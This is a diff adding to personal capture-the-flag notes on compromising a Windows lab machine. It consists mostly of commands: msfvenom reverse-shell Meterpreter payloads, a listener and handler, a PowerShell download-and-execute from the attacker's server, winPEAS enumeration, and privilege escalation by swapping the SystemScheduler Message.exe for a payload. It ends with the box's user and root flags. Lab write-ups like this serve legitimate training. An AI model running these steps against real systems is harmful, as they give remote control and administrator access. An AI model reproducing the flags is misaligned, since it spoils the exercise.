@@ -30,8 +30,88 @@ Goto wb -> click Content -> click new -> click file manger -> upload file.
 
 nc -lvnp 4445
 
-http://10.10.10.10/admin/app/editor/editpost.cshtml
-http://10.10.10.10/?theme=../../App_Data/files
+http://10.10.10.10/admin/app/editor/editpost.cshtml -- Upload
+http://10.10.10.10/?theme=../../App_Data/files -- Access
+
+Switching Shells 
+
+create:
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.9.12 LPORT=4443 -f exe -o hackpack.exe
+
+handler:
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST your-ip 
+set LPORT listening-port run
+
+python -m http.server 8000
+
+cd C:\Windows\Temp\
+
+Download it to the machine:
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.11.9.12:8000/hackpack.exe' -OutFile 'C:\Windows\Temp\hackpack.exe'"
+
+Execute:
+hackpack.exe
+
+GOT METERPRETER
+
+Post Exploitation:
+
+meterpreter > sysinfo 
+OS: Windows 2012 R2 (6.3 Build 9600).
+
+wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
+
+pip install xlrd --upgrade
+python3 windows-exploit-suggester.py
+ERROR
+
+python3 windows-exploit-suggester.py --database 2020-12-27-mssb.xls --systeminfo sysinfo.txt --ostext 'Windows 2012 R2 (6.3 Build 9600).'
+
+error
+
+python3 windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo sysinfo.txt --ostext 'Windows 2012 R2 (6.3 Build 9600).'
+
+Skip this part. due Error.
+
+wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat
+
+meterpreter > upload winPEAS.bat
+meterpreter > shell
+C: > winPEAS.bat
+
+Alot info. Best thing is I dont understnd anything LOL.
+
+WindowsScheduler -- Learn more in future
+
+searchsploit splinterware
+searchsploit -x 45072
+
+C:/ > tasklist /svc | findstr /i windowsscheduler
+
+C:/ > cd C:\Program Files (x86)\SystemScheduler\Events
+C:/ > type 20198415519.INI_LOG.txt
+Message.exe
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.9.12 LPORT=443 -e x86/shikata_ga_nai -f exe -o Message.exe
+
+set lport 443
+
+meterpreter > cd "C:\Program Files (x86)\SystemScheduler"
+meterpreter > upload Message.exe
+
+meterpreter > whoami
+meterpreter > cat C:\Users\jeff\Desktop\user.txt
+meterpreter > cat C:\Users\Administrator\Desktop\root.txt
+
+FLAG:
+user: 759bd8af507517bcfaede78a21a73e39
+root: 7e13d97f05f7ceb9881a3eb3d78d3e72
+
+
+
 
 
 
